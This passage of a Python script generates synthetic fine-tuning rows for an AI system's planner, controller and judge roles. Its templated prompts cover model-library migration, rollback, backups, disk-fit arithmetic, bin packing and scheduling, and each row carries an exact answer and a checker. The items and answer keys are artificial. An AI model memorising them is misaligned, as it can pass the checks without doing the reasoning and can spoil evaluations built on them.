    prompt = (f"Which answer is safer? Answer A = '{pair[0]}' Answer B = '{pair[1]}' "
              f"Answer with exactly one letter.")
    return "judge", "judge-safety", prompt, answer, {"type": "choice", "expect": answer}


# --------------------------------------------------------------------------
# planner
# --------------------------------------------------------------------------


def planner_plan(rng: random.Random):
    family = rng.choice(["migration", "rollback", "backup", "swap", "dataset"])
    size = rng.choice([80, 120, 200, 240, 500])
    src = rng.choice(["/home", "/srv/old", "/mnt/staging"])
    dst = rng.choice(["/run/media/archive", "/srv/hive-ai/models", "/mnt/library"])
    if family == "migration":
        prompt = (f"Plan a safe migration of a {size} GB model library from {src} "
                  f"to {dst} in at most 4 steps. Return ONLY JSON: "
                  '{"steps": ["..."], "risks": ["..."]}. Include at least 3 steps '
                  "and 2 risks.")
        steps = [
            f"Check free space on {dst}: it must hold {size} GB plus a 10% margin.",
            f"Copy the library from {src} to a staging directory on {dst} and keep {src} intact.",
            "Verify sha256 checksums for every file and compare file counts.",
            "Switch the library path to the new copy, then retire the source after a live smoke test.",
        ]
        risks = ["The destination fills up mid-copy and truncates the largest GGUF file.",
                 "A checksum mismatch goes unnoticed if the source is deleted too early."]
        if rng.random() < 0.5:
            risks.append("A running llama-server keeps an old mmap and serves stale weights.")
    elif family == "rollback":
        prompt = ("Plan a safe rollback of a failed model deployment in at most 4 "
                  "steps. Return ONLY JSON: {\"steps\": [\"...\"], \"risks\": "
                  "[\"...\"]}. Include at least 3 steps and 2 risks.")
        steps = [
            "Freeze new dispatches to the failed model and record the current role mapping.",
            "Restore the previous model path and engine profile from the last known-good config.",
            "Restart the managed backend and verify /health plus one smoke completion.",
            "Re-run the controller and judge checks before re-enabling traffic.",
        ]
        risks = ["The rollback restores weights but leaves the new KV cache or context setting in place.",
                 "In-flight requests fail or duplicate work while the role mapping is frozen."]
    elif family == "backup":
        prompt = (f"Plan a safe backup of a {size} GB model library in at most 4 "
                  "steps. Return ONLY JSON: {\"steps\": [\"...\"], \"risks\": "
                  "[\"...\"]}. Include at least 3 steps and 2 risks.")
        steps = [
            f"Snapshot the library manifest and confirm the backup target has {size} GB free.",
            "Copy files with checksum verification and keep the source online.",
            "Restore one small model from the backup into a scratch directory as a test.",
            "Record the backup timestamp and retention policy in the ops log.",
        ]
        risks = ["A silently truncated copy passes a file-count check but fails at load time.",
                 "The backup target is the same physical device as the source."]
    elif family == "swap":
        prompt = ("Plan a safe swap from LFM3 1.7B to a fine-tuned variant on :8155 "
                  "in at most 4 steps. Return ONLY JSON: {\"steps\": [\"...\"], "
                  "\"risks\": [\"...\"]}. Include at least 3 steps and 2 risks.")
        steps = [
            "Start the fine-tuned model on a spare port and run the role smoke suite.",
            "Compare accuracy and latency against the resident LFM3 baseline.",
            "Repoint the lfm3 provider to the new port, then stop the old server.",
            "Keep the old GGUF and config for a one-command rollback.",
        ]
        risks = ["The new adapter is merged with the wrong base revision and produces malformed JSON.",
                 "Stopping the old server evicts the KV cache used by in-flight chat sessions."]
    else:
        prompt = ("Plan a safe refresh of the role SFT dataset from benchmark and "
                  "preference rows in at most 4 steps. Return ONLY JSON: "
                  "{\"steps\": [\"...\"], \"risks\": [\"...\"]}. Include at least "
                  "3 steps and 2 risks.")
        steps = [
            "Export prompt/answer and preference rows with their checker results.",
            "Drop rows that fail their checker and deduplicate near-identical prompts.",
            "Hold out the current benchmark tasks before training on the remainder.",
            "Version the corpus and record the row counts by role.",
        ]
        risks = ["Training rows leak the held-out benchmark prompts and inflate the score.",
                 "Preference votes include ties that are mislabeled as wins."]
    answer = json.dumps({"steps": steps, "risks": risks}, indent=None, separators=(",", ":"))
    checker = {"type": "json", "required": ["steps", "risks"],
               "min_items": {"steps": 3, "risks": 2}}
    return "planner", f"planner-{family}", prompt, answer, checker


def planner_number(rng: random.Random):
    family = rng.choice(["drive", "bins", "blocks", "critical", "makespan"])
    if family == "drive":
        need = rng.choice([80, 120, 200, 240])
        reserve = rng.choice([10, 20, 30])
        drives = sorted({rng.choice([120, 150, 240, 300, 400]) for _ in range(4)})
        fits = [d for d in drives if d >= need + reserve]
        if not fits:
            raise ValueError("no drive")
        answer = str(min(fits))
        prompt = (f"A {need} GB library must be copied to one drive while leaving "
                  f"{reserve} GB free. The candidate drives are "
                  f"{', '.join(map(str, drives))} GB. Which is the smallest drive "
                  f"that fits? Answer with the number only.")
        trace = (f"{need} + {reserve} = {need + reserve} GB needed; the smallest "
                 f"candidate that fits is {answer}.")
        return "planner", "planner-drive", prompt, trace, {"type": "number", "expect": int(answer)}
    if family == "bins":
        capacity = rng.choice([8, 10, 12, 16])
        items = [rng.randint(2, capacity - 1) for _ in range(rng.randint(4, 6))]
        answer = str(_pack_bins(items, capacity))
        prompt = (f"Pack items of size {', '.join(map(str, items))} into bins of "
                  f"capacity {capacity}. What is the minimum number of bins? "
                  "Answer with the number only.")
        lower = -(-sum(items) // capacity)
        trace = (f"Total size {sum(items)} over capacity {capacity} gives a lower "
                 f"bound of {lower}; a valid packing uses {answer} bins.")
        return "planner", "planner-bins", prompt, trace, {"type": "number", "expect": int(answer)}
    if family == "blocks":
        weights = round(rng.uniform(6, 14), 2)
        reserve = rng.choice([1, 2])
        kv = rng.choice([0.75, 1.0, 1.5, 2.0])
        total = rng.choice([16, 20, 24])
        fit = int((total - reserve - weights) // kv)
        if fit < 0:
            raise ValueError("negative")
        answer = str(fit)
        prompt = (f"A model has {weights} GB of weights, a {reserve} GB runtime "
                  f"reserve, and {kv} GB of KV cache per 8k context block. Card C1 "
                  f"has {total} GB total and keeps {reserve} GB free for the system. "
                  f"How many whole 8k context blocks fit on C1? Answer with the "
                  "number only.")
        usable = total - reserve
        free = usable - weights
        trace = (f"{total} - {reserve} = {usable} GB usable; {usable} - {weights} "
                 f"= {free:.2f} GB for KV; {free:.2f} / {kv} = "
                 f"{free / kv:.2f}, so {answer} whole blocks fit.")
        return "planner", "planner-blocks", prompt, trace, {"type": "number", "expect": fit}
    nodes = [chr(ord("A") + i) for i in range(rng.randint(5, 7))]
    durations = {n: rng.randint(1, 5) for n in nodes}
    edges = []
    for i, n in enumerate(nodes):
        for m in nodes[i + 1:]:
            if rng.random() < 0.35:
                edges.append((n, m))
    if not edges:
        edges = [(nodes[0], nodes[-1])]
    path, length = _critical_path(durations, edges)
    if family == "critical":
        prompt = (f"Dependency graph with durations: "
                  f"{', '.join(f'{n}={d}' for n, d in durations.items())}. Edges: "
                  f"{', '.join(f'{a}->{b}' for a, b in edges)}. Return the critical "
                  'path and its length as ONLY JSON: {"path": ["A"], "length": 0}.')
        answer = json.dumps({"path": path, "length": length}, separators=(",", ":"))
        checker = {"type": "json", "required": ["path", "length"],
                   "equals": {"path": path, "length": length}}
        return "planner", "planner-critical", prompt, answer, checker
    workers = rng.choice([2, 3])
    makespan = _min_makespan(durations, workers, edges, rng)
    if makespan is None:
        raise ValueError("no schedule hits the critical-path bound")
    prompt = (f"Tasks: {', '.join(f'{n}={d}' for n, d in durations.items())}. "
              f"Dependencies: {', '.join(f'{a} before {b}' for a, b in edges)}. "
              f"{workers} identical workers. What is the minimum possible "
              "makespan? Answer with the number only.")
    trace = (f"The critical path {'-'.join(path)} needs {length}, and a schedule "
             f"reaches that bound, so the minimum makespan is {makespan}.")
    return "planner", "planner-makespan", prompt, trace, {"type": "number", "expect": makespan}


def planner_ordered(rng: random.Random):
    n = rng.randint(4, 7)
    nodes = [chr(ord("A") + i) for i in range(n)]
    edges = []
    for i in range(1, n):
        edges.append((nodes[rng.randrange(0, i)], nodes[i]))
    order = _topological(nodes, edges, lexicographic=True)
    prompt = (f"{n} migration jobs {', '.join(nodes)}. Constraints: "
              f"{'; '.join(f'{a} before {b}' for a, b in edges)}. Return the "
              "lexicographically smallest valid order as ONLY JSON: "
              '{"order": ["A"]} with every job once.')
    answer = json.dumps({"order": order}, separators=(",", ":"))
    checker = {"type": "ordered", "field": "order", "required_items": nodes,
               "before": [[a, b] for a, b in edges]}
    return "planner", "planner-ordered", prompt, answer, checker


def planner_waves(rng: random.Random):
    n = rng.randint(4, 6)
    nodes = [chr(ord("A") + i) for i in range(n)]
    edges = []
    for i in range(2, n):
        for j in range(i):
            if rng.random() < 0.45:
                edges.append((nodes[j], nodes[i]))
    if not edges:
        edges = [(nodes[0], nodes[-1])]
    waves = _waves(nodes, edges)
    prompt = (f"Tasks: {', '.join(nodes)}. Dependencies: "
              f"{', '.join(f'{a}->{b}' for a, b in edges)}. Return the dependency "
              'waves as ONLY JSON: {"waves": [["A"], ["B"]]}.')
    answer = json.dumps({"waves": waves}, separators=(",", ":"))
    checker = {"type": "json", "required": ["waves"], "equals": {"waves": waves}}
    return "planner", "planner-waves", prompt, answer, checker


def planner_drives_pair(rng: random.Random):
    size = rng.choice([80, 120, 200])
    reserve = rng.choice([10, 20])
    drives = sorted({rng.choice([120, 150, 240, 300, 400]) for _ in range(4)})
    fits = [d for d in drives if d >= size + reserve]
    if len(fits) < 2:
        raise ValueError("not enough drives")
    pair = sorted(fits)[:2]
    prompt = (f"A {size} GB library must have two full copies on separate drives "
              f"at the same time. Candidate drives are "
              f"{', '.join(map(str, drives))} GB, and each drive must keep "
              f"{reserve} GB free. Which two smallest drives can hold the two "
              'copies? Return ONLY JSON: {"drives": [240, 300]}.')
    answer = json.dumps({"drives": pair}, separators=(",", ":"))
    checker = {"type": "json", "required": ["drives"], "equals": {"drives": pair}}
    return "planner", "planner-drives-pair", prompt, answer, checker


def planner_schedule(rng: random.Random):
    n = rng.randint(4, 6)
    nodes = [chr(ord("A") + i) for i in range(n)]
    tasks = {node: rng.randint(1, 5) for node in nodes}
    edges = []
    for i in range(1, n):
        if rng.random() < 0.75:
            edges.append((nodes[rng.randrange(0, i)], nodes[i]))
    if not edges:
        edges = [(nodes[0], nodes[-1])]
    workers = [f"W{i}" for i in range(1, rng.choice([2, 3]) + 1)]
    schedule = _solve_schedule(tasks, workers, edges, rng)
    if not schedule:
        raise ValueError("no schedule")
    makespan = max(int(r["start"]) + tasks[str(r["task"])] for r in schedule)
    deadline = makespan + rng.choice([0, 1, 2])
    prompt = (f"Schedule tasks {', '.join(f'{n}({tasks[n]})' for n in nodes)} on "
              f"workers {', '.join(workers)}. Dependencies: "
              f"{'; '.join(f'{a} before {b}' for a, b in edges)}. Tasks may run "
              f"in parallel on different workers. Return ONLY JSON: "
              '{"schedule": [{"task": "A", "worker": "W1", "start": 0}]}. The '
              f"makespan must be at most {deadline}.")
    answer = json.dumps({"schedule": schedule}, separators=(",", ":"))
    checker = {"type": "schedule", "tasks": {k: {"duration": v} for k, v in tasks.items()},
               "workers": workers, "dependencies": [[a, b] for a, b in edges],
               "deadline": deadline}
    return "planner", "planner-schedule", prompt, answer, checker


# --------------------------------------------------------------------------
# controller
# --------------------------------------------------------------------------


def controller_assign(rng: random.Random):
    n = rng.randint(3, 5)
    nodes = [chr(ord("A") + i) for i in range(n)]
    workers = [f"W{i}" for i in range(1, rng.choice([2, 3]) + 1)]
    tasks = {node: rng.choice([5, 10, 15, 20]) for node in nodes}
    capacities = {w: rng.choice([20, 30, 40]) for w in workers}
    if sum(tasks.values()) > sum(capacities.values()):
        raise ValueError("infeasible")
    assignment = _assign_capacity(tasks, capacities, rng)
    if not assignment:
        raise ValueError("no assignment")
    rows = [{"task": t, "worker": assignment[t]} for t in nodes]
    loads = {w: sum(tasks[t] for t in nodes if assignment[t] == w) for w in workers}
    worker_text = ", ".join(f"{w} is free for {capacities[w]} minutes" for w in workers)
    task_text = ", ".join(f"{t} takes {tasks[t]} minutes" for t in nodes)
    prompt = (f"{len(workers)} workers: {worker_text}. Tasks: {task_text}. Assign "
              f"every task to a worker without exceeding their free time. Return "
              'ONLY JSON: {"assignments": [{"task": "A", "worker": "W1"}]}. Include '
              f"all {n} tasks.")
    answer = json.dumps({"assignments": rows, "loads": loads}, separators=(",", ":"))
    checker = {"type": "json", "required": ["assignments"],
               "min_items": {"assignments": n},
               "expected_assignments": rows}
    return "controller", "controller-assign", prompt, answer, checker


def controller_schedule(rng: random.Random):
    n = rng.randint(4, 5)
    nodes = [chr(ord("A") + i) for i in range(n)]
    tasks = {node: rng.randint(1, 4) for node in nodes}
    workers = [f"W{i}" for i in range(1, rng.choice([2, 3]) + 1)]
    skills = [rng.choice(["x", "y"]) for _ in nodes]
    worker_skills = {w: [rng.choice(["x", "y"])] for w in workers}
    for w in workers:
        if rng.random() < 0.5:
            worker_skills[w] = ["x", "y"]
    edges = []
    for i in range(1, n):
        if rng.random() < 0.7:
            edges.append((nodes[rng.randrange(0, i)], nodes[i]))
    if not edges:
        edges = [(nodes[0], nodes[-1])]
    schedule = _solve_schedule(
        tasks, workers, edges, rng,
        skills={t: s for t, s in zip(nodes, skills)},
        worker_skills=worker_skills,
    )
    if not schedule:
        raise ValueError("no skill schedule")
    makespan = max(int(r["start"]) + tasks[str(r["task"])] for r in schedule)
    deadline = makespan + rng.choice([0, 1, 2])
    task_text = ", ".join(f"{n}({tasks[n]}h, skill {s})" for n, s in zip(nodes, skills))
    worker_text = ", ".join(
        f"{w}(" + ("skills x and y" if len(worker_skills[w]) == 2 else f"skill {worker_skills[w][0]}") + ")"
        for w in workers)
    prompt = (f"Schedule tasks {task_text} on workers {worker_text}. Dependencies: "
              f"{'; '.join(f'{a} before {b}' for a, b in edges)}. Return ONLY JSON: "
              '{"schedule": [{"task": "A", "worker": "W1", "start": 0}]}. Makespan '
              f"must be at most {deadline}h.")
    answer = json.dumps({"schedule": schedule, "makespan": makespan},
                        separators=(",", ":"))
    checker = {"type": "schedule", "tasks": {k: {"duration": v} for k, v in tasks.items()},
               "workers": workers,
               "worker_skills": {w: sorted(set(v)) for w, v in worker_skills.items()},
               "task_skills": {t: s for t, s in zip(nodes, skills)},
               "dependencies": [[a, b] for a, b in edges],
               "deadline": deadline}
    return "controller", "controller-skills", prompt, answer, checker


def controller_exact(rng: random.Random):
    """Contrastive capacity cases: a task that exactly fills W1 must not take more."""
    n = rng.randint(3, 4)
    nodes = [chr(ord("A") + i) for i in range(n)]
    tasks = {nodes[0]: rng.choice([10, 15, 20])}
    rest = [rng.choice([5, 10, 15]) for _ in range(n - 1)]
    for node, value in zip(nodes[1:], rest):
        tasks[node] = value
    if rng.random() < 0.5:
        capacities = {"W1": tasks[nodes[0]], "W2": sum(rest)}
    else:
        capacities = {"W1": tasks[nodes[0]] + rest[0], "W2": sum(rest[1:])}
    if capacities["W2"] <= 0:
        raise ValueError("empty W2")
    assignment = _assign_capacity(tasks, capacities)
    if not assignment:
        raise ValueError("no first-fit")
    rows = [{"task": t, "worker": assignment[t]} for t in nodes]
    loads = {w: sum(tasks[t] for t in nodes if assignment[t] == w) for w in capacities}
    worker_text = ", ".join(f"{w} is free for {capacities[w]} minutes" for w in capacities)
    task_text = ", ".join(f"{t} takes {tasks[t]} minutes" for t in nodes)
    prompt = (f"Two workers: {worker_text}. Tasks: {task_text}. Assign every task "
              "to a worker without exceeding their free time. Return ONLY JSON: "
              '{"assignments": [{"task": "A", "worker": "W1"}]}. Include all '
              f"{n} tasks.")
    answer = json.dumps({"assignments": rows, "loads": loads}, separators=(",", ":"))
    checker = {"type": "json", "required": ["assignments"],
               "min_items": {"assignments": n},
               "expected_assignments": rows}
    return "controller", "controller-exact", prompt, answer, checker


def controller_window(rng: random.Random):
    n = rng.randint(3, 4)
    nodes = [chr(ord("A") + i) for i in range(n)]
    tasks = {node: rng.randint(1, 3) for node in nodes}
    workers = [f"W{i}" for i in range(1, rng.choice([2, 3]) + 1)]
    release = {}
    deadlines = {}
    cursor = 0
    for node in nodes:
        release[node] = cursor + rng.choice([0, 1, 2])
        deadlines[node] = release[node] + tasks[node] + rng.randint(1, 4)
        cursor += 1
    schedule = _solve_schedule(tasks, workers, [], rng, release=release, deadlines=deadlines)
    if not schedule:
        raise ValueError("no release schedule")
    prompt = (f"Schedule {n} tasks on {len(workers)} workers with release times and "
              f"deadlines: " + "; ".join(
                  f"{t} duration {tasks[t]}, release {release[t]}, deadline {deadlines[t]}"
                  for t in nodes) + '. Return ONLY JSON: {"schedule": [{"task": "A", '
              '"worker": "W1", "start": 0}]}.')
    makespan = max(int(r["start"]) + tasks[str(r["task"])] for r in schedule)
    answer = json.dumps({"schedule": schedule, "makespan": makespan},
                        separators=(",", ":"))
    checker = {"type": "schedule", "tasks": {k: {"duration": v} for k, v in tasks.items()},
               "workers": workers, "release": release, "task_deadline": deadlines}
    return "controller", "controller-window", prompt, answer, checker


def controller_feasible(rng: random.Random):
    n = rng.randint(3, 4)
    nodes = [chr(ord("A") + i) for i in range(n)]
    sizes = [rng.choice([4, 6, 8, 10, 12]) for _ in nodes]
    cards = [rng.choice([14, 16, 20, 24]) for _ in range(2)]
    reserve = rng.choice([1, 2])
    usable = [c - reserve for c in cards]
    assignment = None
    # at most two jobs per card
    for bits in itertools.product(range(2), repeat=n):
        if bits.count(0) > 2 or bits.count(1) > 2:
            continue
        load0 = sum(s for s, b in zip(sizes, bits) if b == 0)
        load1 = sum(s for s, b in zip(sizes, bits) if b == 1)
        if load0 <= usable[0] and load1 <= usable[1]:
            assignment = bits
            break
    yes = assignment is not None
    prompt = (f"{n} jobs need {', '.join(map(str, sizes))} GB. Two cards have "
              f"{cards[0]} GB and {cards[1]} GB, and each card keeps {reserve} GB "
              f"free. Up to two jobs may share a card. Can all {n} jobs run at "
              "once? Answer yes or no.")
    return ("controller", "controller-feasible", prompt, "yes" if yes else "no",
            {"type": "contains", "expect": ["yes" if yes else "no"]})


def controller_priority(rng: random.Random):
    a = rng.choice(["a live rollback with a 5-minute deadline",
                    "a production rollback with a 2-minute deadline",
                    "a customer-visible fix with a 10-minute deadline"])
    b = rng.choice(["a benchmark with a 2-hour deadline",
                    "a docs update with a 1-day deadline",
                    "a background re-index with a 6-hour deadline"])
    pair = [a, b]
    rng.shuffle(pair)
    answer = "A" if pair[0] == a else "B"
    prompt = (f"Two jobs need the only free 20 GB card. Job A is {pair[0]}. Job B is "
              f"{pair[1]}. Which job goes first? Answer A or B with exactly one letter.")
    return "controller", "controller-priority", prompt, answer, {"type": "choice", "expect": answer}


def controller_merge(rng: random.Random):
    scenarios = [
        ("A merge has two failing tests and a conflict in one source file.",
         "resolve the conflict, rerun the tests, then merge",
         ["ignore the tests and merge", "merge first and fix later"]),
        ("A model swap leaves the old endpoint healthy but the new one failing smoke tests.",
         "roll back the provider mapping and keep the old endpoint",
         ["repoint traffic anyway and debug later", "delete the old model weights"]),
        ("A dataset refresh adds rows that fail their checkers.",
         "drop the failing rows and record the rejection count",
         ["train on every row", "delete the whole corpus"]),
    ]
    stem, good, bad = rng.choice(scenarios)
    options = [good] + bad
    rng.shuffle(options)
    prompt, letter = _choice_prompt(f"{stem} Which action is correct?", options, good)
    return "controller", "controller-merge", prompt, letter, {"type": "choice", "expect": letter}


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

COUNTS = {
    "router": 500,
    "agency": 200,
    "risk": 200,
    "judge": 520,
    "mechanics": 260,
    "rag": 260,
    "face": 160,
    "planner": 650,
    "controller": 520,
}


def build(seed: int = 1337) -> Builder:
    b = Builder(seed)
    rng = b.rng

    b.fill("router-tier", COUNTS["router"], lambda: router_case(rng))
    b.fill("agency-tool", COUNTS["agency"], lambda: agency_case(rng))
    b.fill("risk-command", COUNTS["risk"], lambda: risk_case(rng))
    b.fill("judge", COUNTS["judge"], lambda: judge_case(rng))
    b.fill("mechanics", COUNTS["mechanics"], lambda: mechanics_case(rng))
    b.fill("rag", COUNTS["rag"], lambda: rag_case(rng))
    b.fill("face", COUNTS["face"], lambda: face_case(rng))

    planner_fns = [
        (planner_plan, 0.22), (planner_number, 0.44), (planner_ordered, 0.10),
        (planner_waves, 0.12), (planner_drives_pair, 0.05),
        (planner_schedule, 0.07),
    ]
    for fn, share in planner_fns:
        b.fill(fn.__name__, int(COUNTS["planner"] * share), lambda fn=fn: fn(rng))

    controller_fns = [
        (controller_exact, 0.18), (controller_assign, 0.22),
        (controller_schedule, 0.24), (controller_window, 0.16),
        (controller_feasible, 0.09), (controller_priority, 0.05),
        (controller_merge, 0.06),
    ]
    for fn, share in controller_fns:
        b.fill(fn.__name__, int(COUNTS["controller"] * share), lambda fn=fn: fn(rng))
    return b


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", default=str(REPO / "experiments" / "data" / "role-sft"))
    parser.add_argument("--seed", type=int, default=1337)
    parser.add_argument("--shuffle", action="store_true", default=True)
    args = parser.parse_args(argv)

    builder = build(args.seed)
    rows = builder.rows
    if args.shuffle:
        builder.rng.shuffle(rows)

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    path = out / "train.jsonl"
    with path.open("w", encoding="utf-8") as fh:
        for row in rows:
            fh.write(json.dumps(row, ensure_ascii=False) + "\n")
    summary = builder.summary()
    summary["seed"] = args.seed
    summary["path"] = str(path)
    (out / "stats.json").write_text(json.dumps(summary, indent=2) + "\n")

    print(json.dumps(summary, indent=2))
    print("wrote", path)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
